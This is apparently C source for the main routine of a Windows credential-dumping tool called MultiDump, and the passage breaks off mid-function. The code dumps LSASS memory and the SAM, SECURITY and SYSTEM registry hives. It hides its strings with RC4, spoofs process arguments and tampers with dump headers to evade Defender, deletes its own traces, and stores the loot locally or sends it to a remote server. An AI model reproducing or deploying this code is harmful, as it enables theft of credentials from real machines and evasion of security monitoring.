#include <Windows.h>
#include <stdio.h>
#include <time.h>

#include "Common.h"
#include "Debug.h"
#include "ProcDump.h"

unsigned char strEncKey[] = {
		0x59, 0xF3, 0x3F, 0x99, 0xD2, 0x3D, 0x4E, 0x67, 0x29, 0xCC, 0xF8, 0x3A, 0x1F, 0x6A, 0x1B, 0xC3,
		0x34, 0xEA, 0x81, 0x0E, 0x36, 0x0D, 0xEA, 0xB2, 0x2D, 0x00, 0x38, 0x0B, 0xA6, 0x89, 0xC1, 0x7A };

unsigned char lsassExeStr[] = {
		0x20, 0x1B, 0x71, 0xD7, 0x20, 0x59, 0x4A, 0xC0, 0x6A, 0xEA, 0x7E, 0x5A, 0xC3, 0xBD, 0x36, 0x19,
		0xF0, 0xFB, 0xE3, 0x5F };

unsigned char procDumpArgs[] = {
		0x61, 0x7A, 0x61, 0xB4, 0x24, 0x29, 0x4D, 0xA5, 0x6C, 0x86, 0x31, 0x7A, 0x8B, 0xD0, 0x2F, 0x19 };

unsigned char dummyProcDumpArgs[] = {
		0x61, 0x1B, 0x63, 0xD7, 0x22, 0x59, 0x5A, 0xC0, 0x7C, 0xEA, 0x20, 0x5A, 0xD2, 0xBD, 0x2B, 0x19,
		0xE0, 0xFB, 0x8F, 0x5F, 0xD5, 0xDF, 0x1C, 0x9C, 0xDD, 0x04, 0xC1, 0x6F, 0xD9, 0x90, 0x3D, 0x93,
		0xDE, 0x71, 0x7A, 0x98, 0xF1, 0x99, 0xDD, 0x8E, 0x25, 0x8A, 0x9B, 0xAB, 0xF7, 0x77, 0x0E, 0xAF,
		0xAB, 0x53, 0xE0, 0x7D, 0xA3, 0x41, 0xBF, 0x60, 0xD9, 0x2B, 0x69, 0x5F, 0x24, 0xF4, 0xF6, 0x1C,
		0x1D, 0x6D, 0xFA, 0xE1, 0x68, 0x2D, 0x71, 0xB0, 0xA1, 0x77, 0xD1, 0x03, 0xA7, 0x9C, 0xF0, 0x2C,
		0x1E, 0x6A, 0x4B, 0x64, 0x33, 0x5A, 0x1B, 0x20, 0x90, 0xC3, 0x08, 0xA7, 0xD5, 0xD7, 0xB5, 0x60,
		0xDC, 0x52, 0x35, 0x41, 0x61, 0xED, 0xAE, 0x8C, 0x5E, 0x75, 0x02, 0x66, 0x00, 0x70, 0x3C, 0x47,
		0xD2, 0xFC, 0x38, 0x75, 0x2C, 0x00, 0x3B, 0x25, 0xB1, 0xB5, 0x6A, 0x76, 0x8D, 0x8B, 0x1C, 0xAE,
		0xA3, 0xBD, 0x74, 0x84, 0x74, 0x26, 0x24, 0xD5, 0xA9, 0x29, 0xB7, 0x3E, 0x7B, 0x80, 0xCD, 0xD9,
		0x3F, 0x53, 0x86, 0xCF, 0xFC, 0xD9, 0x9A, 0xF3, 0xA6, 0x48, 0x7F, 0xE5, 0xE9, 0x1C, 0x05, 0x60,
		0xCF, 0x3F, 0x0E, 0x8A, 0xE3, 0x8F, 0x1F, 0x71, 0x66, 0x87, 0xEA, 0x63, 0xEB, 0x68, 0xC5, 0xE4,
		0x06, 0x20, 0xB6, 0xA7, 0xDA, 0x12, 0xB0, 0x4A, 0xBC, 0x11, 0x34, 0xED, 0xF2, 0xFA, 0xEE, 0xB0,
		0x83, 0x33, 0x42, 0xAC, 0xAF, 0xC5, 0xF8, 0x91, 0x6B, 0x75, 0x0D, 0x99, 0x95, 0x4B, 0xC2, 0x6B,
		0xD7, 0xFB, 0x06, 0xA2, 0xEB, 0x62, 0x5C, 0x59, 0xF9, 0xCF, 0xFF, 0xC6, 0x1F, 0xC1, 0x01, 0x71,
		0xE5, 0x01 };

unsigned char comsvcsArgs[] = {
		0x0F, 0x1B, 0x38, 0xD7, 0x1D, 0x59, 0x6E, 0xC0, 0x70, 0xEA, 0x3E, 0x5A, 0xC2, 0xBD, 0x21, 0x19,
		0xE2, 0xFB, 0x90, 0x5F, 0xE8, 0xDF, 0x6F, 0x9C, 0x89, 0x04, 0xDF, 0x6F, 0xDD, 0x90, 0x78, 0x93,
		0xD5, 0x71, 0x20, 0x98, 0xAF, 0x99, 0xE4, 0x8E, 0x08, 0x8A, 0x8B, 0xAB, 0xE1, 0x77, 0x1A, 0xAF,
		0xAB, 0x53, 0xE3, 0x7D, 0xE2, 0x41, 0xE8, 0x60, 0x85, 0x2B, 0x22, 0x5F, 0x39, 0xF4, 0xEB, 0x1C,
		0x58, 0x6D, 0x99, 0xE1, 0x7F, 0x2D, 0x42, 0xB0, 0xD6, 0x77, 0xFB, 0x03, 0xF3, 0x9C, 0xC8, 0x2C,
		0x35, 0x6A, 0x49, 0x64, 0x2D, 0x5A, 0x37, 0x20, 0xB0, 0xC3, 0x2D, 0xA7, 0xC3, 0xD7, 0xB9, 0x60,
		0xC9, 0x52, 0x34, 0x41, 0x3D, 0xED, 0xEE, 0x8C, 0x67, 0x75, 0x13, 0x66, 0x30, 0x70, 0x39, 0x47,
		0xC8, 0xFC, 0x29, 0x75, 0x27, 0x00, 0x3D, 0x25, 0xEC, 0xB5, 0x6F, 0x76, 0x86, 0x8B, 0x15, 0xAE,
		0xAD, 0xBD, 0x5D, 0x84, 0x70, 0x26, 0x3A, 0xD5, 0xE0, 0x29, 0xDE, 0x3E, 0x6D, 0x80, 0xD0, 0xD9,
		0x3A, 0x53, 0xA6, 0xCF };

unsigned char dummyComsvcsArgs[] = {
		0x0F, 0x1B, 0x38, 0xD7, 0x1D, 0x59, 0x6E, 0xC0, 0x70, 0xEA, 0x3E, 0x5A, 0xC2, 0xBD, 0x21, 0x19,
		0xE2, 0xFB, 0x90, 0x5F, 0xE8, 0xDF, 0x6F, 0x9C, 0x89, 0x04, 0xDF, 0x6F, 0xDD, 0x90, 0x78, 0x93,
		0xD5, 0x71, 0x20, 0x98, 0xAF, 0x99, 0xE4, 0x8E, 0x08, 0x8A, 0x8B, 0xAB, 0xE1, 0x77, 0x1A, 0xAF,
		0xAB, 0x53, 0xE3, 0x7D, 0xE2, 0x41, 0xE8, 0x60, 0x85, 0x2B, 0x22, 0x5F, 0x39, 0xF4, 0xEB, 0x1C,
		0x58, 0x6D, 0x95, 0xE1, 0x35, 0x2D, 0x7B, 0xB0, 0xEF, 0x77, 0xDD, 0x03, 0xED, 0x9C, 0xD8, 0x2C,
		0x33, 0x6A, 0x53, 0x64, 0x37, 0x5A, 0x11, 0x20, 0x82, 0xC3, 0x20, 0xA7, 0xD9, 0xD7, 0xA2, 0x60,
		0xC2, 0x52, 0x1A, 0x41, 0x61, 0xED, 0xB2, 0x8C, 0x4F, 0x75, 0x02, 0x66, 0x30, 0x70, 0x38, 0x47,
		0xEB, 0xFC, 0x3E, 0x75, 0x2A, 0x00, 0x2B, 0x25, 0xAE, 0xB5, 0x2B, 0x76, 0xC5, 0x8B, 0x1A, 0xAE,
		0xE1, 0xBD, 0x75, 0x84, 0x78, 0x26, 0x3A, 0xD5, 0xFC, 0x29, 0xEA, 0x3E, 0x22, 0x80, 0xC9, 0xD9,
		0x2F, 0x53, 0xCB, 0xCF, 0xB4, 0xD9, 0xCC, 0xF3, 0xEF, 0x48, 0x3E, 0xE5, 0xE1, 0x1C, 0x13, 0x60,
		0x82, 0x3F, 0x01, 0x8A, 0xB0, 0x8F, 0x4F, 0x71, 0x25, 0x87, 0xB8, 0x63, 0xA7, 0x68, 0xCB, 0xE4,
		0x52, 0x20, 0xA3, 0xA7, 0xD3, 0x12, 0xAE, 0x4A, 0xE7, 0x11, 0x31, 0xED, 0xEC, 0xFA, 0xA7, 0xB0,
		0xC4, 0x33, 0x4A, 0xAC, 0xFC, 0xC5, 0xF5, 0x91, 0x20, 0x75, 0x17, 0x99, 0x97, 0x4B, 0xD7, 0x6B,
		0xCA, 0xFB, 0x02, 0xA2, 0xED, 0x62, 0x48, 0x59, 0xBC, 0xCF, 0xF6, 0xC6, 0x5C, 0xC1, 0x18, 0x71,
		0x84, 0x01, 0x4C, 0xE3, 0x42, 0xB7, 0x40, 0xC8, 0x81, 0x74, 0x49, 0x71, 0x1F, 0xD3, 0xA0, 0xE7,
		0xE6, 0x78, 0xD8, 0x4E, 0x93, 0x62, 0xA2, 0x2E, 0xEB, 0xF1, 0x23, 0xE1, 0x69, 0xE5, 0x42, 0x18,
		0x41, 0x15, 0xA3, 0x20, 0xA2, 0x13, 0x6E, 0x43, 0x33, 0xDA, 0xB2, 0x16, 0x4E, 0x66, 0x2B, 0xB8,
		0x51, 0xCC, 0xC2, 0xB9, 0xBE, 0xCE, 0x58, 0x88, 0xAD, 0x08, 0x6D, 0xF0, 0xD4, 0x83 };

unsigned char regArgs[] = {
		0x0F, 0x1B, 0x38, 0xD7, 0x1D, 0x59, 0x6E, 0xC0, 0x70, 0xEA, 0x3E, 0x5A, 0xC2, 0xBD, 0x21, 0x19,
		0xE2, 0xFB, 0x90, 0x5F, 0xE8, 0xDF, 0x6F, 0x9C, 0x89, 0x04, 0xDF, 0x6F, 0xDD, 0x90, 0x78, 0x93,
		0xD5, 0x71, 0x20, 0x98, 0xAF, 0x99, 0xE4, 0x8E, 0x08, 0x8A, 0x9B, 0xAB, 0xE8, 0x77, 0x50, 0xAF,
		0xA2, 0x53, 0xF7, 0x7D, 0xB4, 0x41, 0xFA, 0x60, 0xD8, 0x2B, 0x26, 0x5F, 0x37, 0xF4, 0xEB, 0x1C,
		0x58, 0x6D, 0x92, 0xE1, 0x0E, 0x2D, 0x52, 0xB0, 0xCC, 0x77, 0xCE, 0x03, 0x9D, 0x9C };

unsigned char dummyRegArgs[] = {
		0x0F, 0x1B, 0x38, 0xD7, 0x1D, 0x59, 0x6E, 0xC0, 0x70, 0xEA, 0x3E, 0x5A, 0xC2, 0xBD, 0x21, 0x19,
		0xE2, 0xFB, 0x90, 0x5F, 0xE8, 0xDF, 0x6F, 0x9C, 0x89, 0x04, 0xDF, 0x6F, 0xDD, 0x90, 0x78, 0x93,
		0xD5, 0x71, 0x20, 0x98, 0xAF, 0x99, 0xE4, 0x8E, 0x08, 0x8A, 0x9B, 0xAB, 0xE8, 0x77, 0x50, 0xAF,
		0xA2, 0x53, 0xF7, 0x7D, 0xB4, 0x41, 0xFA, 0x60, 0xCE, 0x2B, 0x3F, 0x5F, 0x31, 0xF4, 0xE1, 0x1C,
		0x0A, 0x6D, 0xAE, 0xE1, 0x65, 0x2D, 0x56, 0xB0, 0xCA, 0x77, 0xD7, 0x03, 0xC4, 0x9C, 0xF3, 0x2C,
		0x16, 0x6A, 0x71, 0x64, 0x1D, 0x5A, 0x2A, 0x20, 0xAF, 0xC3, 0x0B, 0xA7, 0xFD, 0xD7, 0x8C, 0x60,
		0xEF, 0x52, 0x11, 0x41, 0x47, 0xED, 0x92, 0x8C, 0x7E, 0x75, 0x2C, 0x66, 0x0C, 0x70, 0x3B, 0x47,
		0xDD, 0xFC, 0x2B, 0x75, 0x33, 0x00, 0x2F, 0x25, 0xB0, 0xB5, 0x6E, 0x76, 0xB6, 0x8B, 0x34, 0xAE,
		0xE4, 0xBD, 0x73, 0x84, 0x6B, 0x26, 0x3B, 0xD5, 0xFA, 0x29, 0xF5, 0x3E, 0x7E, 0x80, 0xC9, 0xD9,
		0x16, 0x53, 0xF1, 0xCF, 0xAD, 0xD9, 0xC4, 0xF3, 0xE2, 0x48, 0x3D, 0xE5, 0xF3, 0x1C, 0x13, 0x60,
		0xFE, 0x3F, 0x6D, 0x8A, 0xA1, 0x8F, 0x58, 0x71, 0x31, 0x87, 0xAF, 0x63, 0xA8, 0x68, 0xD8, 0xE4,
		0x3E, 0x20, 0xA7, 0xA7, 0xCD, 0x12, 0xB1, 0x4A, 0xA3, 0x11, 0x3A, 0xED, 0xF0, 0xFA, 0xCE, 0xB0 };

//==========================================================================================================================================================

BOOL IsPrivileged() {
	BOOL isAdminOrDebugPrivilege = FALSE;
	HANDLE hToken = NULL;

	// Open a handle to the access token for the calling process
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		// First check for administrative privileges
		TOKEN_ELEVATION tokenElevation;
		DWORD dwSize;
		if (GetTokenInformation(hToken, TokenElevation, &tokenElevation, sizeof(tokenElevation), &dwSize)) {
			isAdminOrDebugPrivilege = tokenElevation.TokenIsElevated;
		}

		// Check for SeDebugPrivilege if not already determined to be an admin
		if (!isAdminOrDebugPrivilege) {
			DWORD dwSize = 0;
			GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
			PTOKEN_PRIVILEGES privileges = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);

			if (privileges && GetTokenInformation(hToken, TokenPrivileges, privileges, dwSize, &dwSize)) {
				LUID luidDebugPrivilege;
				if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidDebugPrivilege)) {
					for (DWORD i = 0; i < privileges->PrivilegeCount; ++i) {
						if ((privileges->Privileges[i].Luid.LowPart == luidDebugPrivilege.LowPart) &&
							(privileges->Privileges[i].Luid.HighPart == luidDebugPrivilege.HighPart) &&
							(privileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)) {
							isAdminOrDebugPrivilege = TRUE;
							break;
						}
					}
				}
			}
			if (privileges) {
				HeapFree(GetProcessHeap(), 0, privileges);
			}
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return isAdminOrDebugPrivilege;
}

//==========================================================================================================================================================
// main function start

int main(int argc, char* argv[]) {
#ifdef DEBUG
	printf("    __  __       _ _   _ _____                        \n");
	printf("   |  \\/  |_   _| | |_(_)  __ \\ _   _ _ __ ___  _ __  \n");
	printf("   | |\\/| | | | | | __| | |  | | | | | '_ ` _ \\| '_ \\ \n");
	printf("   | |  | | |_| | | |_| | |__| | |_| | | | | | | |_) |\n");
	printf("   |_|  |_|\\__,_|_|\\__|_|_____/ \\__,_|_| |_| |_| .__/ \n");
	printf("                                               |_|    \n");
#endif // DEBUG

	if (!IsPrivileged()) {
#ifdef DEBUG
		printf("[!] Dumping LSASS Requires Elevated Privileges!");
#endif // DEBUG
		return -1;
	}

#ifdef SELF_DELETION

	DeleteSelf();

#endif // SELF_DELETION

	srand(time(NULL));

	DWORD		dwLsassPid = NULL;
	CHAR		szRealCmd[256];

	WCHAR		wszRealCmd[512],
				wszTmpPath[MAX_PATH],
				wszTmpFile[256],
				wszDummyCmd[1024];

	WCHAR*		wszProcDumpPath = NULL;

	PBYTE		pSamData = NULL,
				pSecurityData = NULL,
				pSystemData = NULL,
				pDumpData = NULL;

	DWORD		dwDumpSize = NULL,
				dwSamSize = NULL,
				dwSecuritySize = NULL,
				dwSystemSize = NULL;
	INT			lsassDumpRetryCount = 0;

	CHAR	rc4Key[RC4KEYSIZE], encRc4Key[RC4KEYSIZE];

	ParsedArgs	args = ParseArgs(argc, argv);

	INT standardDelay,
		longDelay;

	if (args.connectionDelay) {
		standardDelay = 3000;
		longDelay = 60000;
	}
	else {
		standardDelay = 1000;
		longDelay = 10000;
	}

//==========================================================================================================================================================
// Getting PID of lsass.exe

	Rc4EncryptionViaSystemFunc032(strEncKey, lsassExeStr, sizeof(strEncKey), sizeof(lsassExeStr));

	if (!GetRemoteProcessInfo(lsassExeStr, &dwLsassPid, NULL)) {
#ifdef DEBUG
		wprintf(L"[!] Cound Not Get %s's PID \n", lsassExeStr);
#endif // DEBUG
		return -1;
	}

#ifdef DEBUG
	wprintf(L"[+] Found \"%s\" - Of PID : %d \n", lsassExeStr, dwLsassPid);
#endif // DEBUG

//==========================================================================================================================================================
// Constructing the temp file

		// getting the tmp folder path
	if (!GetTempPathW(MAX_PATH, wszTmpPath)) {
#ifdef DEBUG
		printf("[!] GetTempPathW Failed With Error : %d \n", GetLastError());
#endif
		return -1;
	}

	// getting the tmp file name
	time_t now = time(NULL);
	struct tm* timeinfo = localtime(&now);

	wcsftime(wszTmpFile, sizeof(wszTmpFile) / sizeof(WCHAR), L"debug_file_process_info_%Y%m%d_%H%M%S.dmp", timeinfo);

//==========================================================================================================================================================
// Constructing the procdump commands

	if (args.procDumpMode) {

		Rc4EncryptionViaSystemFunc032(strEncKey, procDumpArgs, sizeof(strEncKey), sizeof(procDumpArgs));
		Rc4EncryptionViaSystemFunc032(strEncKey, dummyProcDumpArgs, sizeof(strEncKey), sizeof(dummyProcDumpArgs));

		snprintf(szRealCmd, sizeof(szRealCmd), "%s %s %d -o %s", args.procDumpPath, procDumpArgs, dwLsassPid, args.tempDmpPath);
		swprintf(wszRealCmd, sizeof(wszRealCmd) / sizeof(WCHAR), L"%S", szRealCmd);

		wszProcDumpPath = ConvertToWideString(args.procDumpPath, strlen(args.procDumpPath));
		swprintf(wszDummyCmd, sizeof(wszDummyCmd) / sizeof(WCHAR), L"%ls %ls %ls%ls", wszProcDumpPath, dummyProcDumpArgs, wszTmpPath, wszTmpFile);
	}

//==========================================================================================================================================================
// Constructing the comsvcs commands

	else {
		Rc4EncryptionViaSystemFunc032(strEncKey, comsvcsArgs, sizeof(strEncKey), sizeof(comsvcsArgs));
		Rc4EncryptionViaSystemFunc032(strEncKey, dummyComsvcsArgs, sizeof(strEncKey), sizeof(dummyComsvcsArgs));

		snprintf(szRealCmd, sizeof(szRealCmd), "%d %s full", dwLsassPid, args.tempDmpPath);
		swprintf(wszRealCmd, sizeof(wszRealCmd) / sizeof(WCHAR), L"%ls %S", comsvcsArgs, szRealCmd);

		swprintf(wszDummyCmd, sizeof(wszDummyCmd) / sizeof(WCHAR), L"%ls%ls", dummyComsvcsArgs, wszTmpFile);
	}

//==========================================================================================================================================================
// Start process with spoofed arguments

#ifdef DEBUG
	if (args.verboseMode) {
		wprintf(L"[i] Real Command: %s\n", wszRealCmd);
		wprintf(L"[i] Dummy Command: %s\n\n", wszDummyCmd);
	}
#endif // DEBUG

	if (wcslen(wszRealCmd) > wcslen(wszDummyCmd)) {
#ifdef DEBUG
		printf("[!] Real Command Cannot Be Longer Than Dummy Command!\n");
#endif // DEBUG
		goto ErrorCleanUp;
	}

	HANDLE		hProcess = NULL,
				hThread = NULL;

	DWORD		dwProcessId = NULL;
	DWORD		dwArgsLen = NULL;

	if (args.procDumpMode) {
		printf("[i] Dumping LSASS Using ProcDump...\n");
		WriteToFile(ProcDump, sizeof(ProcDump), args.procDumpPath, args.verboseMode);
		dwArgsLen = wcslen(wszProcDumpPath) * 2;
	}
	else {
		printf("[i] Dumping LSASS Using comsvcs.dll...\n");
		dwArgsLen = 64;  // hardcoded since the path is the same
	}

LsassDumpRetry:
	if (args.noDump) {
		if (!CreateArgSpoofProcess(wszDummyCmd, wszDummyCmd, dwArgsLen, args.verboseMode, &dwProcessId, &hProcess, &hThread)) {
#ifdef DEBUG
			printf("[!] Failed to Create Process to Dump LSASS!");
#endif // DEBUG
			goto ErrorCleanUp;
		}
	}
	else {
		if (!CreateArgSpoofProcess(wszDummyCmd, wszRealCmd, dwArgsLen, args.verboseMode, &dwProcessId, &hProcess, &hThread)) {
#ifdef DEBUG
			printf("[!] Failed to Create Process to Dump LSASS!");
#endif // DEBUG
			goto ErrorCleanUp;
		}
	}

//==========================================================================================================================================================
// Looting LSASS dump

#ifdef DEBUG
	if (args.verboseMode) {
		printf("[i] Reading Dump File and Zeroing Bytes...\n");
	}
#endif // DEBUG


	INT		retryCount;

	// We need to modify the dump asap but also can't let it run forever if the dump isn't created
	// If there's a delay, even Sleep(1), it gets caught by defender, so hammer that API
	// It might take longer if the dump is large, 100000 should be a good number
	if (args.procDumpMode) {
		Sleep(100); // Wait a little for the dump file to get created, procdump is slower
	}
	for (retryCount = 0; retryCount < 100000; retryCount++) {
		if (ZeroOutBytes(args.tempDmpPath, 6)) {
			break;
		}
	}

#ifdef DEBUG
	if (args.verboseMode) {
		printf("[i] Retry Count: %d\n", retryCount);
	}
#endif // DEBUG

	if (retryCount == 100000) {
		printf("[!] Failed to Locate LSASS Dump File!\n");

		DWORD threadCount = 0;

		DWORD* suspendedThreads = GetRemoteProcessSuspendedThreads(lsassExeStr, &threadCount);

		if (suspendedThreads == NULL) {
#ifdef DEBUG
			if (args.verboseMode) {
				printf("[i] LSASS is Running, Continuing...\n");
			}
#endif // DEBUG
		}
		else {
#ifdef DEBUG
			printf("[i] LSASS is Suspended, Resuming Threads...\n");
#endif // DEBUG
			ResumeThreads(suspendedThreads, threadCount, args.verboseMode);
			free(suspendedThreads);
		}
#ifdef RETRY_DUMP_ON_FAILURE
		if (!args.noDump) {
			if (lsassDumpRetryCount < RETRY_LIMIT) {
#ifdef DEBUG
				printf("\n[i] Trying to Dump LSASS Again...\n");
#endif // DEBUG
				lsassDumpRetryCount++;
				goto LsassDumpRetry;
			}
		}
#endif // RETRY_DUMP_ON_FAILURE

		if (args.regDump) {
			// Generate key for reg encryption when no LSASS dump is created
			GenerateRandomBytes(rc4Key, RC4KEYSIZE);
			memcpy(encRc4Key, rc4Key, RC4KEYSIZE);
			goto RegDump;
		}
		else {
			goto ErrorCleanUp;
		}
	}

	if (ReadFromFile(args.tempDmpPath, &pDumpData, &dwDumpSize)) {
#ifdef DEBUG
		printf("[+] LSASS Dump Read: %.2f MB\n\n", (double)dwDumpSize / (1024 * 1024));
#endif // DEBUG
	}
	else {
		printf("[-] Unable to Read LSASS Dump");
		goto ErrorCleanUp;
	}

	GenerateRandomBytes(rc4Key, RC4KEYSIZE);

	memcpy(encRc4Key, rc4Key, RC4KEYSIZE);

	if (!Rc4EncryptionViaSystemFunc032(rc4Key, pDumpData, RC4KEYSIZE, dwDumpSize)) {
		goto ErrorCleanUp;
	}

//==========================================================================================================================================================
// Clean up files

#ifdef DEBUG
	printf("[i] Cleaning up local files...\n");
#endif // DEBUG

	FileExistsAndDelete(args.tempDmpPath, TRUE);

	if (args.procDumpMode) {
		// Make sure it's deleted, procdump could still be running even after dump file has been created
		for (retryCount = 0; retryCount < 20; retryCount++) {
			if (FileExistsAndDelete(args.procDumpPath, TRUE)) {
				break;
			}
			else {
				Sleep(100);
			}
		}

		if (retryCount == 20) {
#ifdef DEBUG
			printf("[!] Failed to Delete %s\n", args.procDumpPath);
#endif // DEBUG
		}
	}

#ifdef DEBUG
	printf("\n");
#endif // DEBUG

//==========================================================================================================================================================
// Dumping registries
// This implementation is not the best, there defeintley are better ways to do it. oh well it's an added feature

	dwArgsLen = 54; // Also hardcoded since the path is the same

RegDump:
	if (args.regDump) {
#ifdef DEBUG
		printf("[i] Dumping Registry Hives...\n");
#endif // DEBUG

		WCHAR	wszDummyRegCmd[1024],
				wszSamCmd[512],
				wszSecurityCmd[512],
				wszSystemCmd[521],
				wszSaveName[6],
				wszRegSavePath[MAX_PATH];

		CHAR*	szRegSavePath = NULL;

		Rc4EncryptionViaSystemFunc032(strEncKey, regArgs, sizeof(strEncKey), sizeof(regArgs));
		Rc4EncryptionViaSystemFunc032(strEncKey, dummyRegArgs, sizeof(strEncKey), sizeof(dummyRegArgs));

		wcsftime(wszTmpFile, sizeof(wszTmpFile) / sizeof(WCHAR), L"registry_debug_info_%Y%m%d_%H%M%S.data", timeinfo);
		swprintf(wszDummyRegCmd, sizeof(wszDummyRegCmd) / sizeof(WCHAR), L"%ls %ls%ls", dummyRegArgs, wszTmpPath, wszTmpFile);

		GenerateFileNameW(wszSaveName, 6);
		swprintf(wszRegSavePath, sizeof(wszRegSavePath) / sizeof(WCHAR), L"%ls%ls", wszTmpPath, wszSaveName);
		szRegSavePath = ConvertToAsciiString(wszRegSavePath, wcslen(wszRegSavePath));

		swprintf(wszSamCmd, sizeof(wszSamCmd) / sizeof(WCHAR), L"%lsSAM %ls", regArgs, wszRegSavePath);
		swprintf(wszSecurityCmd, sizeof(wszSecurityCmd) / sizeof(WCHAR), L"%lsSECURITY %ls", regArgs, wszRegSavePath);
		swprintf(wszSystemCmd, sizeof(wszSystemCmd) / sizeof(WCHAR), L"%lsSYSTEM %ls", regArgs, wszRegSavePath);

#ifdef DEBUG
		if (args.verboseMode) {
			wprintf(L"[i] Real Reg Commands:\t%s\n", wszSamCmd);
			wprintf(L"\t\t\t%s\n", wszSecurityCmd);
			wprintf(L"\t\t\t%s\n", wszSystemCmd);

			wprintf(L"[i] Dummy Reg Commands: %s\n\n", wszDummyRegCmd);
		}
#endif // DEBUG


//===================================================================
// Dumping SAM
		if (!CreateArgSpoofProcess(wszDummyRegCmd, wszSamCmd, dwArgsLen, args.verboseMode, &dwProcessId, &hProcess, &hThread)) {
#ifdef DEBUG
			printf("[!] Failed to Create Process to Dump SAM\n");
#endif // DEBUG
			if (pDumpData == NULL) {
				goto ErrorCleanUp;
			}
			else {
				goto ProcessDumps;
			}
		}

		for (retryCount = 0; retryCount < 20; retryCount++) {
			if (ReadFromFile(szRegSavePath, &pSamData, &dwSamSize)) {
#ifdef DEBUG
				printf("[+] SAM Save Read: %.2f MB\n", (double)dwSamSize / (1024 * 1024));
#endif // DEBUG
				break;
			}
			Sleep(100);
		}

		if (retryCount == 20) {
			printf("[-] Unable to Read SAM Save\n");
			if (pDumpData == NULL) {
				goto ErrorCleanUp;
			}
			else {
				goto ProcessDumps;
			}
		}

		if (!Rc4EncryptionViaSystemFunc032(rc4Key, pSamData, RC4KEYSIZE, dwSamSize)) {
			if (pDumpData == NULL) {
				goto ErrorCleanUp;
			}
			else {
				goto ProcessDumps;
			}
		}

		FileExistsAndDelete(szRegSavePath, TRUE);

//===================================================================
// Dumping SECURITY
		if (!CreateArgSpoofProcess(wszDummyRegCmd, wszSecurityCmd, dwArgsLen, args.verboseMode, &dwProcessId, &hProcess, &hThread)) {
#ifdef DEBUG
			printf("[!] Failed to Create Process to Dump SECURITY\n");
#endif // DEBUG
			if (pDumpData == NULL) {
				goto ErrorCleanUp;
			}
			else {
				goto ProcessDumps;
			}
		}

		for (retryCount = 0; retryCount < 20; retryCount++) {
			if (ReadFromFile(szRegSavePath, &pSecurityData, &dwSecuritySize)) {
#ifdef DEBUG
				printf("[+] SECURITY Save Read: %.2f MB\n", (double)dwSecuritySize / (1024 * 1024));
#endif // DEBUG
				break;
			}
			Sleep(100);
		}

		if (retryCount == 20) {
			printf("[-] Unable to Read SECURITY Save\n");
			if (pDumpData == NULL) {
				goto ErrorCleanUp;
			}
			else {
				goto ProcessDumps;
			}
		}

		if (!Rc4EncryptionViaSystemFunc032(rc4Key, pSecurityData, RC4KEYSIZE, dwSecuritySize)) {
			if (pDumpData == NULL) {
				goto ErrorCleanUp;
			}
			else {
				goto ProcessDumps;
			}
		}

		FileExistsAndDelete(szRegSavePath, TRUE);

//===================================================================
// Dumping SYSTEM
		if (!CreateArgSpoofProcess(wszDummyRegCmd, wszSystemCmd, dwArgsLen, args.verboseMode, &dwProcessId, &hProcess, &hThread)) {
#ifdef DEBUG
			printf("[!] Failed to Create Process to Dump SYSTEM\n");
#endif // DEBUG
			if (pDumpData == NULL) {
				goto ErrorCleanUp;
			}
			else {
				goto ProcessDumps;
			}
		}

		for (retryCount = 0; retryCount < 20; retryCount++) {
			if (ReadFromFile(szRegSavePath, &pSystemData, &dwSystemSize)) {
#ifdef DEBUG
				printf("[+] SYSTEM Save Read: %.2f MB\n", (double)dwSystemSize / (1024 * 1024));
#endif // DEBUG
				break;
			}
			Sleep(100);
		}

		if (retryCount == 20) {
			printf("[-] Unable to Read SYSTEM Save\n");
			if (pDumpData == NULL) {
				goto ErrorCleanUp;
			}
			else {
				goto ProcessDumps;
			}
		}

		if (!Rc4EncryptionViaSystemFunc032(rc4Key, pSystemData, RC4KEYSIZE, dwSystemSize)) {
			if (pDumpData == NULL) {
				goto ErrorCleanUp;
			}
			else {
				goto ProcessDumps;
			}
		}

		FileExistsAndDelete(szRegSavePath, TRUE);

#ifdef DEBUG
		printf("\n");
#endif // DEBUG
	}

//==========================================================================================================================================================
// Local mode

ProcessDumps:

	if (args.localMode) {
#ifdef DEBUG
		printf("[i] Local Mode Selected. Writing Encrypted File(s) to Disk...\n");
#endif // DEBUG
		if (pDumpData != NULL) {
			WriteToFile(pDumpData, dwDumpSize, args.localDmpPath, TRUE);
		}
		if (pSamData != NULL && pSecurityData != NULL && pSystemData != NULL) {
			CHAR	currentDir[MAX_PATH],
					samSavePath[MAX_PATH],
					securitySavePath[MAX_PATH],
					systemSavePath[MAX_PATH];

			if (_getcwd(currentDir, MAX_PATH) == NULL) {
#ifdef DEBUG
				printf("[!] Unable to Get Current Directory!");
#endif // DEBUG
			}
			else {
				sprintf(samSavePath, "%s\\sam.dat", currentDir);
				sprintf(securitySavePath, "%s\\security.dat", currentDir);
				sprintf(systemSavePath, "%s\\system.dat", currentDir);

				WriteToFile(pSamData, dwSamSize, samSavePath, TRUE);
				WriteToFile(pSecurityData, dwSecuritySize, securitySavePath, TRUE);
				WriteToFile(pSystemData, dwSystemSize, systemSavePath, TRUE);
			}

		}

		PrintKey(rc4Key, RC4KEYSIZE);
	}

//==========================================================================================================================================================
// Remote mode

	else {
		char				serverIp[16];
		int					serverPort;
		unsigned __int64	combinedKey;
		CHAR				encRc4DataWithType[65];

#ifdef DEBUG
		printf("[i] Remote Mode Selected\n");
#endif // DEBUG

		if (ParseIPAndPort(args.remotePath, serverIp, &serverPort, &combinedKey)) {
#ifdef DEBUG
			if (args.verboseMode) {
				printf("[i] Encrypting key with: %llu\n", combinedKey);
			}
#endif // DEBUG
		}
		else {
			printf("[!] Failed to Parse IP and Port, Saving Locally Instead.\n");
			WriteToFile(pDumpData, dwDumpSize, args.localDmpPath, TRUE);

			PrintKey(rc4Key, RC4KEYSIZE);

			goto ErrorCleanUp;
		}

		// Encrypting the key with ip
		if (!Rc4EncryptionViaSystemFunc032((PBYTE)&combinedKey, encRc4Key, sizeof(combinedKey), RC4KEYSIZE)) {
			goto ErrorCleanUp;
		}


		if (pDumpData != NULL && pSamData != NULL && pSecurityData != NULL && pSystemData != NULL) {
